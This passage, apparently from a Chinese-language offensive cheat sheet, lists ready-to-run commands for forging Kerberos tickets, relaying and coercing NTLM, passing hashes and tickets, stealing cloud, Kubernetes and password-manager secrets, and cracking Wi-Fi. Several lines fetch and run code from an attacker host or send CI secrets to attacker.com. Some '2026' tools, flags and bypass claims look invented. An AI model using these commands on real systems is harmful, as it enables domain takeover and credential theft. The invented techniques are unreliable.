Silver Ticket使用服务账户的NTLM哈希伪造特定服务的TGS票据，比Golden Ticket更隐蔽（不经过KDC）。

```bash
# ===== 前提：获取服务账户（如MSSQL、CIFS、HTTP）的NTLM哈希 =====
# 通过Kerberoasting破解获得

# ===== mimikatz Silver Ticket =====
# 获取域SID和服务的SPN
# 伪造CIFS服务的Silver Ticket
mimikatz.exe "kerberos::golden \
  /domain:corp.local \
  /sid:S-1-5-21-XXXX-XXXX-XXXX \
  /target:dc01.corp.local \
  /service:CIFS \
  /rc4:SERVICE_ACCOUNT_NTLM_HASH \
  /user:Administrator \
  /ptt" exit

# 伪造HOST服务票据（包含计划任务、WMI、文件共享）
mimikatz.exe "kerberos::golden /domain:corp.local /sid:S-1-5-21-XXXX-XXXX-XXXX \
  /target:dc01.corp.local /service:HOST /rc4:HASH /user:Admin /ptt" exit

# 伪造HTTP服务票据（WinRM/PowerShell Remoting）
mimikatz.exe "kerberos::golden /domain:corp.local /sid:S-1-5-21-XXXX-XXXX-XXXX \
  /target:dc01.corp.local /service:HTTP /rc4:HASH /user:Admin /ptt" exit

# 伪造LDAP服务票据（DCSync）
mimikatz.exe "kerberos::golden /domain:corp.local /sid:S-1-5-21-XXXX-XXXX-XXXX \
  /target:dc01.corp.local /service:LDAP /rc4:HASH /user:Admin /ptt" exit

# 使用Silver Ticket执行DCSync
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
```

### 7.6 Diamond Ticket / Sapphire Ticket

```bash
# ===== Diamond Ticket =====
# 特点：使用AES256密钥而非RC4，修改TGT中的PAC
# 使用Rubeus
Rubeus.exe diamond \
  /domain:corp.local \
  /user:Administrator \
  /password:Password123 \
  /dc:dc01.corp.local \
  /aes256:AES256_KEY_OF_KRBTGT \
  /ticketuser:DA_User \
  /ticketuserid:1111 \
  /groups:512,513,518,519,520 \
  /ptt

# ===== Sapphire Ticket =====
# 2026最新技术：利用FAST (Flexible Authentication Secure Tunneling) 装甲
# 绕过2026年Windows Server的Kerberos PAC签名验证增强
# 使用impacket-ticketer增强版
impacket-ticketer \
  -domain-sid S-1-5-21-XXXX-XXXX-XXXX \
  -domain corp.local \
  -aesKey AES256_KEY_OF_KRBTGT \
  -user Administrator \
  -groups 512,513,518,519,520 \
  -extra-pac  # 添加额外的PAC数据
```

### 7.7 Kerberos委派攻击

```bash
# ===== 非约束委派 (Unconstrained Delegation) =====
# 查找非约束委派账户
Get-DomainComputer -Unconstrained
Get-DomainUser -TrustedToAuth

# 使用Rubeus监听TGT
Rubeus.exe monitor /interval:5 /filteruser:DC01$

# 使用krbrelayx进行非约束委派攻击
python3 krbrelayx.py -t 192.168.1.10 -c 'ipconfig'

# ===== 约束委派 (Constrained Delegation) =====
# 查找约束委派账户
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# 使用Rubeus请求S4U票据
Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator \
  /msdsspn:CIFS/dc01.corp.local /ptt

# 使用impacket-getST
impacket-getST -spn CIFS/dc01.corp.local -impersonate Administrator \
  corp.local/svc_account:Password123

# ===== 基于资源的约束委派 (RBCD) =====
# 添加RBCD权限
# 使用rbcd.py
python3 rbcd.py -delegate-from COMPUTER$ -delegate-to DC01$ \
  -action write corp.local/user:Password123

# 使用Rubeus获取票据
Rubeus.exe s4u /user:COMPUTER$ /rc4:COMPUTER_HASH /impersonateuser:Administrator \
  /msdsspn:CIFS/dc01.corp.local /ptt
```

### 7.8 2026 Kerberos PAC签名绕过

```bash
# ===== 2026年Kerberos安全增强 =====
# Windows Server 2025和Windows 11 24H2引入了PAC签名强制验证
# PAC (Privilege Attribute Certificate) 签名验证默认启用

# ===== PAC签名绕过技术 =====
# 方法1：使用AES256密钥而非RC4（规避RC4降级检测）
# 方法2：利用FAST装甲隧道绕过PAC验证
# 方法3：S4U2Self + 约束委派链

# 检测PAC签名状态
# 注册表路径: HKLM\SYSTEM\CurrentControlSet\Services\Kdc\Parameters
# PacSignatureValidationLevel: 0=禁用 1=审计 2=强制

# 使用noPac (CVE-2021-42287 + CVE-2021-42278)
# 2026年该漏洞补丁已在Windows Server 2022+中修复
# 但Windows Server 2016/2019仍在部分环境中存在
noPac.exe scan -domain corp.local -user user -pass Password123
noPac.exe -domain corp.local -user user -pass Password123 \
  /dc dc01.corp.local /mAccount attacker_machine$ /mPassword AttackerPass123 /service cifs /ptt
```

---

## 8. NTLM攻击

NTLM是Windows的旧认证协议，尽管微软推荐Kerberos，NTLM仍在许多场景中广泛使用。NTLM中继、哈希捕获、签名绕过是内网渗透的核心技术。

### 8.1 Responder — NTLM哈希捕获

```bash
# ===== 基础Responder配置 =====
# 修改Responder.conf
sed -i 's/HTTP = On/HTTP = Off/g' /usr/share/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /usr/share/responder/Responder.conf

# 启动Responder（监听模式）
responder -I eth0 -v

# 启动Responder（带分析模式）
responder -I eth0 -A

# 特定协议监听
responder -I eth0 -wrf  # WPAD/HTTP/HTTPS/SMB

# 输出文件位置
# /usr/share/responder/logs/
# SMB-NTLMv2-SSP-192.168.1.100.txt
# HTTP-NTLMv2-192.168.1.101.txt

# ===== 分析捕获的哈希 =====
# 格式: user::domain:challenge:HMAC-MD5:blob
# Hashcat模式 5600
hashcat -m 5600 responder_hashes.txt /wordlists/rockyou.txt -r best64.rule

# ===== Responder高级配置 =====
# 启用IPv6攻击
responder -I eth0 -P -v

# 多播名称解析投毒
responder -I eth0 -b

# 强制WPAD认证
responder -I eth0 -w -F
```

### 8.2 NTLM中继 — ntlmrelayx

```bash
# ===== 基础NTLM中继 =====
# 启动中继服务器
impacket-ntlmrelayx -tf targets.txt -smb2support

# 中继到SMB并执行命令
impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell -enc BASE64_ENCODED_COMMAND"

# 中继到LDAP并添加用户
impacket-ntlmrelayx -tf targets.txt -smb2support -i

# 中继到LDAPS（SSL）
impacket-ntlmrelayx -tf targets.txt -smb2support \
  --no-wcf-server --no-http-server --no-smb-server

# 中继到HTTP并执行命令
impacket-ntlmrelayx -tf targets.txt -smb2support -e payload.exe

# ===== 高级中继 =====
# 跨协议中继（SMB→LDAP）
# 利用LDAP签名不是默认要求的场景
impacket-ntlmrelayx -t ldap://dc01.corp.local -smb2support \
  --escalate-user attacker_user

# 中继到ADCS HTTP端点（ESC8）
impacket-ntlmrelayx -t http://dc01.corp.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# 中继到MSSQL
impacket-ntlmrelayx -t mssql://192.168.1.200 -smb2support \
  -q "EXEC xp_cmdshell 'whoami'"

# 中继到IMAP
impacket-ntlmrelayx -t imap://mail.corp.local -smb2support

# ===== 2026 NTLM中继新技术 =====
# SMB over QUIC中继
impacket-ntlmrelayx -t smb://quic-target.corp.local:443 -smb2support \
  --quic

# HTTP/3 NTLM中继
impacket-ntlmrelayx -t https://web.corp.local -smb2support \
  --http3
```

### 8.3 Inveigh — Windows原生NTLM攻击

```powershell
# ===== Inveigh（PowerShell版）=====
Import-Module .\Inveigh.ps1

# 启动LLMNR/NBT-NS/mDNS投毒
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y

# 仅监听不投毒
Invoke-Inveigh -ConsoleOutput Y -LLMNR N -NBNS N -mDNS N -SMB Y

# 获取捕获的哈希
Get-Inveigh -ConsoleOutput Y

# 清除捕获数据
Get-Inveigh -ConsoleOutput Y -Clear

# ===== InveighZero（C#版，更隐蔽）=====
InveighZero.exe -LLMNR Y -NBNS Y -mDNS Y -HTTPS Y -SMB Y

# 启用Kerberos中继
InveighZero.exe -DNS Y -LLMNR Y -NBNS Y -Kerberos Y
```

### 8.4 强制认证技术

```bash
# ===== PetitPotam（强制SMB认证）=====
# 强制目标向攻击者发起SMB认证
python3 PetitPotam.py -u user -p Password123 -d corp.local \
  attacker_ip target_ip

# 配合ntlmrelayx使用
# 终端1: 启动中继
impacket-ntlmrelayx -t smb://192.168.1.100 -smb2support
# 终端2: 触发强制认证
python3 PetitPotam.py attacker_ip 192.168.1.100

# ===== PrinterBug (MS-RPRN) =====
# 利用打印服务强制认证
python3 printerbug.py corp.local/user:Password123@target_ip attacker_ip

# 使用dementor.py
python3 dementor.py -d corp.local -u user -p Password123 attacker_ip target_ip

# ===== DFSCoerce =====
# 利用DFS分布式文件系统强制认证
python3 DFSCoerce.py -d corp.local -u user -p Password123 \
  -target-ip target_ip attacker_ip

# ===== ShadowCoerce =====
# 利用FSRM（文件服务器资源管理器）强制认证
python3 ShadowCoerce.py -d corp.local -u user -p Password123 \
  attacker_ip target_ip

# ===== WebDAV NTLM强制认证 =====
# 创建恶意的WebDAV链接
# \\attacker_ip@80\share\file
# 当用户点击链接时，NTLM哈希被捕获
```

### 8.5 AD CS 攻击 — ESC1-8

```bash
# ===== AD CS 攻击场景 =====
# ESC1: 模板允许请求者指定SAN（主体备用名称）
# ESC2: 模板允许低权限用户注册
# ESC3: 注册代理模板滥用
# ESC4: 模板ACL滥用（修改模板配置）
# ESC5: PKI对象ACL滥用
# ESC6: CA的EDITF_ATTRIBUTESUBJECTALTNAME2标志
# ESC7: CA角色权限滥用（ManageCA/ManageCertificates）
# ESC8: NTLM中继到AD CS Web注册端点

# ===== 使用Certify发现AD CS漏洞 =====
Certify.exe find /vulnerable
Certify.exe find /ca:CA01.corp.local\Corp-CA /vulnerable

# ===== ESC1利用 =====
# 请求带有额外SAN的证书
Certify.exe request /ca:CA01.corp.local\Corp-CA \
  /template:VulnerableTemplate \
  /altname:Administrator

# 使用证书获取TGT
Rubeus.exe asktgt /user:Administrator \
  /certificate:cert.pfx /password:password /ptt

# ===== ESC8利用（NTLM中继到ADCS）=====
# 配合PetitPotam
impacket-ntlmrelayx -t http://CA01.corp.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController
python3 PetitPotam.py attacker_ip dc01.corp.local
```

### 8.6 SMB签名要求

```bash
# ===== 检测SMB签名状态 =====
# 使用crackmapexec
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# 使用nmap
nmap -p 445 --script smb2-security-mode 192.168.1.0/24

# 使用RunFinger
python3 RunFinger.py -i 192.168.1.0/24

# SMB签名要求:
# - 签名禁用: 可中继到任何目标
# - 签名启用但不强制: 可中继到自身
# - 签名强制: 不可中继
```

---

## 9. Pass-the-Hash / Pass-the-Ticket

凭据传递是内网横向移动的核心技术——攻击者不需要明文密码，仅使用NTLM哈希或Kerberos票据即可访问远程系统。

### 9.1 Pass-the-Hash (PtH) 工具链

```bash
# ===== 1. impacket-wmiexec =====
impacket-wmiexec -hashes :NTLM_HASH corp.local/Administrator@192.168.1.100
impacket-wmiexec -hashes :NTLM_HASH corp.local/Administrator@192.168.1.100 \
  "powershell -enc BASE64_PAYLOAD"

# ===== 2. impacket-smbexec =====
impacket-smbexec -hashes :NTLM_HASH corp.local/Administrator@192.168.1.100

# ===== 3. impacket-psexec =====
impacket-psexec -hashes :NTLM_HASH corp.local/Administrator@192.168.1.100

# ===== 4. impacket-atexec =====
# 通过计划任务执行命令
impacket-atexec -hashes :NTLM_HASH corp.local/Administrator@192.168.1.100 \
  "cmd.exe /c whoami > C:\temp\out.txt"

# ===== 5. evil-winrm =====
evil-winrm -i 192.168.1.100 -u Administrator -H NTLM_HASH

# ===== 6. crackmapexec =====
crackmapexec smb 192.168.1.100 -u Administrator -H NTLM_HASH -x whoami
crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH --local-auth

# ===== 7. mimikatz PtH =====
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator \
  /domain:corp.local /ntlm:NTLM_HASH /run:cmd.exe" exit

# ===== 8. xfreerdp PtH =====
xfreerdp /u:Administrator /pth:NTLM_HASH /v:192.168.1.100

# ===== 9. Metasploit PsExec =====
msfconsole -q -x "use exploit/windows/smb/psexec; \
  set SMBUser Administrator; set SMBPass NTLM_HASH; \
  set RHOSTS 192.168.1.100; run"
```

### 9.2 Overpass-the-Hash

Overpass-the-Hash是将NTLM哈希转换为Kerberos TGT的过程，然后用TGT进行Kerberos认证。

```bash
# ===== 方法1：Rubeus =====
# 使用NTLM哈希获取TGT
Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /ptt

# 使用AES256密钥
Rubeus.exe asktgt /user:Administrator /aes256:AES256_KEY /ptt

# 使用证书
Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:certpass /ptt

# ===== 方法2：mimikatz =====
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator \
  /domain:corp.local /ntlm:NTLM_HASH /run:cmd.exe" exit

# 验证票据
klist

# ===== 方法3：impacket-getTGT =====
impacket-getTGT corp.local/Administrator -hashes :NTLM_HASH
export KRB5CCNAME=Administrator.ccache

# 使用TGT访问服务
impacket-psexec corp.local/Administrator@dc01.corp.local -k -no-pass
```

### 9.3 Pass-the-Ticket (PtT)

```bash
# ===== 方法1：mimikatz PtT =====
# 导出票据
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit

# 注入票据
mimikatz.exe "kerberos::ptt ticket.kirbi" exit

# 清除票据
mimikatz.exe "kerberos::purge" exit

# ===== 方法2：Rubeus PtT =====
# 从内存中提取票据
Rubeus.exe dump

# 注入base64编码的票据
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWo...

# 从kirbi文件注入
Rubeus.exe ptt /ticket:ticket.kirbi

# 从LSASS提取并注入
Rubeus.exe triage
Rubeus.exe dump /luid:0x12345 /service:krbtgt /nowrap

# ===== 方法3：impacket PtT =====
# 使用kirbi票据
export KRB5CCNAME=ticket.kirbi
impacket-psexec corp.local/Administrator@dc01.corp.local -k -no-pass

# 转换kirbi到ccache
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
```

### 9.4 凭据传递自动化

```bash
# ===== CrackMapExec 全自动凭据传递 =====
# 使用捕获的哈希进行横向移动
crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH

# 使用多个哈希进行横向
crackmapexec smb 192.168.1.0/24 -u users.txt -H hashes.txt

# 执行命令并收集输出
crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH \
  -x "powershell IEX (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')"

# ===== 2026 NetExec 智能横向 =====
# 自动识别有效凭据并横向移动
netexec smb 192.168.1.0/24 -u users.txt -H hashes.txt \
  --continue-on-success --lateral

# 自动执行DCSync
netexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH \
  --ntds --output ntds_output
```

---

## 10. 2026最新攻击技术

### 10.1 AI辅助密码猜测

```bash
# ===== LLM密码模式学习 =====
# 使用Transformer模型分析泄露密码库
python3 ai_password_model.py \
  --train-data /breaches/collection.txt \
  --model-type gpt-neo \
  --epochs 10 \
  --output-model password_model.pt

# 生成上下文感知密码
python3 ai_contextual_guess.py \
  --model password_model.pt \
  --context "Acme Corp, Technology, San Francisco, 2026" \
  --num-guesses 100000

# ===== 2026 AI密码猜测Pipeline =====
# 1. 收集目标信息（公司名、行业、地点、员工、文化）
# 2. 使用LLM生成候选密码
# 3. 通过规则引擎生成变体
# 4. 使用概率排序
# 5. 安全执行密码喷射

# 示例：AI密码猜测与Hashcat集成
python3 ai_hashcat_pipeline.py \
  --target-company "Acme Corp" \
  --target-industry "Technology" \
  --breach-data /breaches/collection.txt \
  --hashcat-mode 1000 \
  --hashes ntlm_hashes.txt \
  --output cracked.txt
```

### 10.2 量子计算对Hash算法的威胁

```text
===== 量子计算威胁评估 =====

1. Grover算法攻击：
   - 对对称密码（包括Hash）提供二次加速
   - NTLM/MD4: 2^128 经典 → 2^64 量子 (Grover)
   - SHA-256: 2^256 经典 → 2^128 量子 (Grover)
   - 实际影响: 128位安全性降为64位，256位降为128位
   - 当前量子计算机 (2026): ~1000逻辑量子比特
   - 攻击NTLM需要: ~4000逻辑量子比特（预计2030-2035）

2. Shor算法攻击：
   - 对RSA/ECC非对称密码有效
   - 不影响NTLM/Kerberos等对称Hash
   - 但影响PKI体系（证书认证）

3. 2026年量子安全建议：
   - 迁移到SHA-512或更高强度Hash
   - 增加密码长度要求（>16字符）
   - 部署后量子密码学(PQC)算法
   - 使用混合认证（传统+量子安全）

4. PQC过渡期攻击：
   - 混合模式降级攻击
   - "先存储后解密"(Harvest Now, Decrypt Later)
   - 证书链中的传统算法残留
```

### 10.3 Passwordless认证绕过

```bash
# ===== FIDO2 / WebAuthn 攻击 =====
# 1. 检测WebAuthn实现
python3 webauthn_detect.py --target https://login.corp.com

# 2. 降级到密码认证
# 如果网站同时支持Passkey和密码，尝试密码认证
python3 webauthn_downgrade.py \
  --target https://login.corp.com \
  --username admin@corp.com

# 3. WebAuthn中继攻击
# 2026年发现的WebAuthn中继漏洞
python3 webauthn_relay.py \
  --target-victim https://bank.com \
  --target-attacker https://evil.com \
  --session-id SESSION_ID

# 4. Passkey钓鱼
# 创建诱饵页面诱骗用户进行Passkey认证
python3 passkey_phish.py \
  --target https://login.corp.com \
  --phish-domain https://login-corp.com

# ===== 生物特征Hash提取 =====
# 2026年生物特征模板攻击
# 指纹模板Hash: 可从部分传感器中提取
# 面部识别模板: 可从系统缓存中提取
# 声纹模板: 可从语音认证系统中提取

# 生物特征模板注入攻击
python3 biometric_injection.py \
  --target-system "Windows Hello" \
  --template-file stolen_template.bin
```

### 10.4 2026新兴攻击面

```bash
# ===== 云端凭据攻击 =====
# 1. AWS EC2元数据服务v2绕过
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# 2. Azure Managed Identity令牌窃取
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://management.azure.com/"

# 3. GCP元数据
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# ===== Kubernetes Secrets =====
# 从Pod中提取Secrets
kubectl get secrets -o yaml
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /run/secrets/kubernetes.io/serviceaccount/token

# 从etcd直接读取
ETCDCTL_API=3 etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets/ --prefix

# ===== Serverless函数凭据 =====
# AWS Lambda环境变量
# /proc/self/environ
# Azure Functions local.settings.json
# GCP Cloud Functions环境变量

# ===== CI/CD凭据泄露 =====
# GitHub Actions Secrets
# 通过workflow注入提取
# GitLab CI/CD Variables
# Jenkins凭据存储
# CircleCI环境变量
# ArgoCD Secrets
```

---

## 11. 凭据存储安全

### 11.1 密码管理器攻击

```bash
# ===== KeePass 攻击 =====
# 从内存中提取KeePass凭据
# 使用KeeThief
Import-Module .\KeeThief.ps1
Get-KeePassDatabaseKey -Memory

# 从进程转储提取
procdump.exe -ma KeePass.exe keepass.dmp
strings keepass.dmp | grep -i "password"

# 破解KeePass数据库
# Hashcat模式 13400
keepass2john database.kdbx > keepass.hash
hashcat -m 13400 keepass.hash /wordlists/rockyou.txt

# ===== LastPass / 1Password / Bitwarden 攻击 =====
# 浏览器扩展凭据提取
# 1Password: 从浏览器扩展存储中提取
# Bitwarden: 从本地存储中提取
# LastPass: 从浏览器扩展中提取

# 内存转储提取
python3 password_manager_extract.py \
  --target-process "1Password.exe" \
  --output creds.txt

# 2026 密码管理器Vault解密
# 通过DPAPI解密本地Vault
SharpDPAPI.exe vaults
```

### 11.2 云凭据管理器攻击

```bash
# ===== AWS Secrets Manager =====
# 列出Secrets
aws secretsmanager list-secrets --region us-east-1

# 获取Secret值
aws secretsmanager get-secret-value \
  --secret-id prod/database/password \
  --region us-east-1

# 批量导出所有Secrets
for secret in $(aws secretsmanager list-secrets --query 'SecretList[].Name' --output text); do
  aws secretsmanager get-secret-value --secret-id "$secret" >> all_secrets.txt
done

# ===== Azure Key Vault =====
# 列出Key Vault中的Secrets
az keyvault secret list --vault-name corp-keyvault

# 获取Secret值
az keyvault secret show --vault-name corp-keyvault --name DatabasePassword

# 通过Managed Identity访问
az keyvault secret show --vault-name corp-keyvault --name prod-password

# ===== HashiCorp Vault =====
# 通过API访问
curl -H "X-Vault-Token: $VAULT_TOKEN" \
  http://vault.corp.local:8200/v1/secret/data/prod/database

# KV v2引擎
vault kv get secret/prod/database

# 从快照恢复（如果权限允许）
vault operator raft snapshot restore backup.snap

# ===== GCP Secret Manager =====
gcloud secrets list
gcloud secrets versions access latest --secret="prod-db-password"
```

### 11.3 GitHub / GitLab 凭据泄露

```bash
# ===== GitHub Secrets扫描 =====
# 使用truffleHog
trufflehog git https://github.com/org/repo.git --json

# 使用git-secrets
git secrets --scan -r /path/to/repo

# 使用Gitleaks
gitleaks detect --source /path/to/repo -v

# 使用shhgit
shhgit --search "api_key\|secret\|token\|password" \
  --org target-org

# ===== GitHub Actions Secrets提取 =====
# 如果控制了workflow，可以提取secrets
# 在workflow YAML中:
# - name: Exfiltrate Secrets
#   run: |
#     curl -X POST https://attacker.com/collect \
#       -d "token=${{ secrets.AWS_ACCESS_KEY_ID }}"

# ===== Git历史记录搜索 =====
# 搜索已删除的敏感文件
git log --all --full-history -- "**/.env"
git log --diff-filter=D --summary | grep delete

# 搜索特定模式
git rev-list --all | xargs git grep -i "password\|secret\|token\|key" 2>/dev/null

# 恢复已删除的敏感文件
git checkout $(git rev-list -n 1 HEAD -- "$file")^ -- "$file"
```

### 11.4 容器镜像凭据泄露

```bash
# ===== Docker镜像凭据扫描 =====
# 扫描镜像层
docker save image:tag -o image.tar
tar -xf image.tar
# 检查每个层
for layer in */layer.tar; do
  tar -xf $layer -C /tmp/layer_extract
  grep -r "password\|secret\|token\|key" /tmp/layer_extract/
  rm -rf /tmp/layer_extract
done

# 使用dive检查镜像层
dive image:tag

# 使用trivy扫描
trivy image --severity HIGH,CRITICAL image:tag

# ===== 容器运行时凭据 =====
# Docker配置文件
cat ~/.docker/config.json
cat /root/.docker/config.json

# Kubernetes Secrets
kubectl get secrets -o json | jq -r '.items[].data | map_values(@base64d)'

# 容器环境变量
docker inspect container_id | jq '.[0].Config.Env'
```

---

## 12. 无线网络密码攻击

### 12.1 WPA/WPA2 攻击

```bash
# ===== 捕获WPA2握手包 =====
# 使用hcxdumptool（推荐，2026）
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# 使用airodump-ng
airmon-ng start wlan0
airodump-ng wlan0mon

# 针对目标AP捕获
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 发送Deauth强制重新握手
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# ===== PMKID攻击（无需客户端）=====
# 使用hcxdumptool获取PMKID
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1 \
  --filtermode=2 --filterlist_ap=targets.txt

# 使用hcxtools转换为Hashcat格式
hcxpcapngtool -o pmkid.hc22000 capture.pcapng

# ===== 破解WPA/WPA2 =====
# WPA2 PMKID (Hashcat模式 22000)
hashcat -m 22000 pmkid.hc22000 /wordlists/rockyou.txt

# WPA2 4-way handshake (Hashcat模式 2500)
hashcat -m 2500 capture.hccapx /wordlists/rockyou.txt

# 使用掩码攻击
hashcat -m 22000 pmkid.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# 使用规则
hashcat -m 22000 pmkid.hc22000 /wordlists/rockyou.txt -r best64.rule

# 使用管道
crunch 8 8 0123456789 | hashcat -m 22000 pmkid.hc22000

# ===== 2026 WPA2破解加速 =====
# GPU集群破解
hashcat -m 22000 pmkid.hc22000 /wordlists/rockyou.txt \
  -d 1,2,3,4 --backend-devices=fpga:1

# 预计算PMK（用于特定SSID）
genpmk -s "TargetSSID" -d pmk_dict -f /wordlists/rockyou.txt
cowpatty -d pmk_dict -s "TargetSSID" -r capture.cap
```

### 12.2 WPA3 攻击

```bash
# ===== WPA3-SAE攻击 =====
# Dragonblood漏洞族
# CVE-2019-9494: 时序侧信道 → 密码枚举
# CVE-2019-9495: 缓存侧信道
# CVE-2019-9496: SAE确认重放
# CVE-2019-9498: EAP-pwd降级
# CVE-2019-9499: SAE提交重放

# 使用Dragontool
python3 dragontool.py -a AA:BB:CC:DD:EE:FF -i wlan0mon

# WPA3 Transition Mode降级攻击
# 如果AP同时支持WPA2和WPA3，可降级到WPA2
# 使用hostapd-mana创建Evil Twin
hostapd-mana -B /etc/mana-toolkit/hostapd-mana.conf

# 捕获WPA3握手
# Hashcat模式 16800
hashcat -m 16800 wpa3_handshake.txt /wordlists/rockyou.txt

# ===== 2026 WPA3新攻击面 =====
# SAE-PK（Protected Key）绕过
# WPA3-Enterprise GCMP重放
# OWE (Opportunistic Wireless Encryption) 降级
# WPA3 192-bit模式中的降级攻击
```

### 12.3 WPS PIN攻击

```bash
# ===== WPS PIN暴力破解 =====
# 使用reaver
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# 使用pixiewps（离线PIN破解）
pixiewps -e PKE -r PKR -s E-HASH1 -z E-HASH2 -a AUTHKEY -n E-S1 -o E-S2

# 使用OneShot（Python3）
python3 oneshot.py -i wlan0mon -b AA:BB:CC:DD:EE:FF

# 使用wifite（自动化）
wifite --wps --wps-only

# ===== WPS PIN计算 =====
# 使用wash扫描WPS AP
wash -i wlan0mon

# 已知PIN计算器（部分芯片组）
# 算法: PIN = fn(serial_number, MAC)
# 使用在线工具: https://wpsfinder.com
```

### 12.4 Evil Twin / WiFi钓鱼

```bash
# ===== Evil Twin攻击 =====
# 使用airgeddon
airgeddon

# 使用Fluxion
./fluxion.sh

# 使用wifiphisher
wifiphisher -aI wlan0mon -jI wlan1 -e "CorpWiFi"

# 手动创建Evil Twin
# 1. 创建同名AP
airbase-ng -e "TargetWiFi" -c 6 wlan0mon

# 2. 配置DHCP
ifconfig at0 up
ifconfig at0 10.0.0.1 netmask 255.255.255.0
dhcpd -cf /etc/dhcp/dhcpd.conf at0

# 3. 启用转发
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# 4. 捕获凭据（使用hostapd-wpe）
hostapd-wpe hostapd-wpe.conf
# 输出: /tmp/hostapd-wpe/hostapd-wpe.log

# ===== KRACK攻击（Key Reinstallation Attack）=====
# 针对WPA2四次握手
# 使用krackattacks-scripts
python3 krack-4-way-handshake.py wlan0mon
```

---

## 13. 自动化工具链

### 13.1 CrackMapExec / NetExec

```bash
# ===== 凭据审计 =====
# 验证所有凭据有效性
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt \
  --continue-on-success | tee cred_audit.txt

# 识别本地管理员
crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH \
  --local-auth | grep "Pwn3d!"

# 枚举共享
crackmapexec smb 192.168.1.0/24 -u user -p pass --shares

# 枚举用户
crackmapexec smb 192.168.1.0/24 -u user -p pass --users

# 枚举组
crackmapexec smb 192.168.1.0/24 -u user -p pass --groups

# 执行命令
crackmapexec smb 192.168.1.0/24 -u user -p pass -x whoami

# 执行PowerShell
crackmapexec smb 192.168.1.0/24 -u user -p pass -X 'Get-Process'

# ===== NetExec 2026 增强 =====
# 模块化攻击
netexec smb 192.168.1.0/24 -u user -p pass -M spider_plus
netexec smb 192.168.1.0/24 -u user -p pass -M lsassy
netexec smb 192.168.1.0/24 -u user -p pass -M nanodump
netexec smb 192.168.1.0/24 -u user -p pass -M handlekatz

# 全自动凭据收集
netexec smb 192.168.1.0/24 -u user -p pass -M lsassy -o PROTOCOL=smb
```

### 13.2 BloodHound / SharpHound

```bash
# ===== SharpHound数据收集 =====
# .NET版本
SharpHound.exe -c All -d corp.local

# 仅收集特定数据
SharpHound.exe -c Session,Group,LocalAdmin -d corp.local

# 使用Stealth选项
SharpHound.exe -c All -d corp.local --stealth

# PowerShell版本
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain corp.local

# 从Linux收集
bloodhound-python -d corp.local -u user -p Password123 \
  -c All -ns 192.168.1.10

# ===== BloodHound分析 =====
# 启动BloodHound
bloodhound --no-sandbox

# 常见查询
# - 查找域管理员最短路径
# - 查找Kerberoastable用户
# - 查找AS-REP Roastable用户
# - 查找具有DCSync权限的用户
# - 查找非约束委派
# - 查找约束委派
# - 查找RBCD攻击路径

# ===== PlumHound（BloodHound报告）=====
python3 PlumHound.py --task Tasks/default.tasks -p neo4j_password
python3 PlumHound.py --task Tasks/kerberoasting.tasks -p neo4j_password
```

### 13.3 密码策略审计

```bash
# ===== Windows密码策略审计 =====
# 使用PowerShell
Get-ADDefaultDomainPasswordPolicy | Format-List
Get-ADFineGrainedPasswordPolicy -Filter * | Format-List

# 使用crackmapexec
crackmapexec smb 192.168.1.10 --pass-pol

# 使用ldapsearch
ldapsearch -x -h dc01 -b "DC=corp,DC=local" \
  "(objectClass=domainDNS)" \
  minPwdLength pwdHistoryLength pwdProperties \
  lockoutThreshold lockoutDuration lockoutObservationWindow

# ===== 密码策略评估 =====
# 检查项:
# 1. 最小密码长度 (<8 = 高风险)
# 2. 密码复杂度要求 (是否启用)
# 3. 密码历史记录 (<5 = 高风险)
# 4. 账户锁定阈值 (0 = 无锁定, 极高风险)
# 5. 锁定观察窗口 (太短 = 高风险)
# 6. 是否存在细粒度密码策略
# 7. 默认域策略是否有例外

# ===== 密码强度审计 =====
# 使用DSInternals
